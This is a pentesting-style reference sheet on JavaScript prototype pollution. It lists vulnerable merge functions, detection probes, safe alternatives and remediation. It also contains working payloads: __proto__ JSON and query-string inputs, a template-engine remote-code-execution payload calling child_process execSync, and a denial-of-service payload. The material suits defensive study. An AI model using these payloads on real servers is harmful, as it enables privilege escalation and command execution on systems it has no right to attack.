# API Reference: Prototype Pollution in JavaScript

## What is Prototype Pollution?
Attacker modifies `Object.prototype` through unsafe object merge operations,
causing all JavaScript objects to inherit attacker-controlled properties.

## Attack Vectors

### JSON Body
```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

### Query Parameters
```
?__proto__[isAdmin]=true
?constructor[prototype][isAdmin]=true
```

### URL Path
```
/api/merge?__proto__.polluted=true
```

## Vulnerable Functions

| Library | Function | Risk |
|---------|----------|------|
| Native | `Object.assign()` | Medium (shallow only) |
| lodash | `_.merge()` | HIGH |
| lodash | `_.defaultsDeep()` | HIGH |
| jQuery | `$.extend(true, ...)` | HIGH |
| hoek | `Hoek.merge()` | HIGH |
| node-forge | Various | HIGH |

## Exploitation Impact

### Privilege Escalation
```javascript
// Server checks: if (user.isAdmin) { ... }
// After pollution: Object.prototype.isAdmin = true
// All objects now have isAdmin = true
```

### RCE via Template Engines
```json
{"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').execSync('id')"}}}
```

### Denial of Service
```json
{"__proto__": {"toString": null}}
```

## Source Code Detection Patterns

### Dangerous Sinks
```javascript
// lodash merge
_.merge(target, userInput)

// Recursive assign
function merge(target, source) {
    for (let key in source) {
        target[key] = source[key]  // No __proto__ check!
    }
}
```

### Safe Alternatives
```javascript
// Object.create(null) — no prototype
const obj = Object.create(null)

// Filter __proto__
if (key === '__proto__' || key === 'constructor') continue;

// Object.freeze(Object.prototype)
Object.freeze(Object.prototype)  // Prevent modification
```

## Testing with pp-finder

```bash
# Scan npm package for prototype pollution
npx pp-finder /path/to/node_modules/package
```

## Burp Suite Extension — Server-Side Prototype Pollution

### Detection
1. Send `{"__proto__": {"status": 510}}` in JSON body
2. If response status changes to 510, server is vulnerable
3. Send `{"__proto__": {"json spaces": 10}}` — response indentation changes

## Remediation
1. Use `Map` instead of plain objects for user data
2. Freeze `Object.prototype`
3. Validate/sanitize keys: reject `__proto__`, `constructor`, `prototype`
4. Use `Object.create(null)` for merge targets
5. Update vulnerable libraries (lodash >= 4.17.12)
